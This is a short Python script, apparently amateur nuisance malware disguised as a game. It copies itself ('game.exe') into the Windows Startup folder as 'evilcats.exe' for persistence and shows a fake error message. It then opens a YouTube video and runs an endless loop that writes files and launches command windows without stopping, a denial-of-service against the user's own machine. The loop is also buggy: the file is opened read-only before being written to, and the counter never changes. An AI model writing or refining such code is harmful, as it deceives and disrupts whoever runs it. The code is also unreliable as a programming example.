import os
import socket
import subprocess
import random
import shutil
import pynput
import time
login =os.getlogin()
path =os.getcwd()
shutil.copy( "game.exe", "C:/Users/"+login+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evilcats.exe")
print("a error has encoured please wait")
os.system("start https://www.youtube.com/watch?v=Kz-LK0OBOfM&ab_channel=SlowTVRelax%26Background")
time.sleep(0.5)
i = 1


while True:

 with open(str(i) + "cat.txt") as file:

  file.write(":3")
  os.system("start")
